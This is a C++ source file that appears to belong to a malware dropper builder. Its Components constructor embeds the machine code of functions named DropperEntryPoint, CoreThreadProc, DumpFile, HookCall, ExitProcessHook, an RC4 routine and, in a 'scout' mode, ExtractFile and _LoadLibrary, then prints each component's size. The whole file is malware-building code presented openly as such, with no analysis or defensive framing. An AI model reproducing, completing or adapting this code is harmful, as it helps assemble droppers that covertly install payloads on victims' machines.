#include <iomanip>
#include <iostream>
#include <string>
using namespace std;

#include "DropperCode.h"
#include "DropperCodeScout.h"
#include "Components.h"

Components::Components(BOOL bScout)
{
	if (!bScout)
	{
		cout << endl;
		cout << "DROPPER COMPONENTS" << endl;
		cout << endl;

		embedFunction_( (char*) DropperEntryPoint, (char*) DropperEntryPoint_End , entryPoint_);
		embedFunction_( (char*) CoreThreadProc, (char*) CoreThreadProc_End, coreThread_);
		embedFunction_( (char*) DumpFile, (char*) DumpFile_End, dumpFile_);
		embedFunction_( (char*) HookCall, (char*) HookCall_End, hookCall_);
		embedFunction_( (char*) ExitProcessHook, (char*) ExitProcessHook_End, exitProcess_);
		embedFunction_( (char*) ExitHook, (char*) ExitHook_End, exit_);
		embedFunction_( (char*) arc4, (char*) arc4_End, rc4_);

		cout << "DropperEntryPoint: " << setw(8) << right << entryPoint_.size << " bytes" << endl;
		cout << "CoreThreadProc   : " << setw(8) << right << coreThread_.size << " bytes" << endl;
		cout << "DumpFile         : " << setw(8) << right << dumpFile_.size << " bytes" << endl;
		cout << "HookCall         : " << setw(8) << right << hookCall_.size << " bytes" << endl;
		cout << "ExitProcess      : " << setw(8) << right << exitProcess_.size << " bytes" << endl;
		cout << "Exit             : " << setw(8) << right << exit_.size << " bytes" << endl;
		cout << "RC4              : " << setw(8) << right << rc4_.size << " bytes" << endl;
	}
	else //scout
	{	
		embedFunction_( (char*) DropperScoutEntryPoint, (char*) DropperScoutEntryPoint_End , entryPoint_);
		embedFunction_( (char*) ExtractFile, (char*) ExtractFile_End, dumpFile_);
		embedFunction_( (char*) ExitProcessHook, (char*) ExitProcessHook_End, exitProcess_);
		embedFunction_( (char*) arc4, (char*) arc4_End, rc4_);
		embedFunction_( (char*) _LoadLibrary, (char *) _LoadLibrary_End, load_);

		cout << "DropperEntryPoint: " << setw(8) << right << entryPoint_.size << " bytes" << endl;
		cout << "ExtractFile      : " << setw(8) << right << dumpFile_.size << " bytes" << endl;
		cout << "ExitProcess      : " << setw(8) << right << exitProcess_.size << " bytes" << endl;
		cout << "RC4              : " << setw(8) << right << rc4_.size << " bytes" << endl;
		cout << "_LoadLibrary     : " << setw(8) << right << load_.size << " bytes" << endl;
	}
}
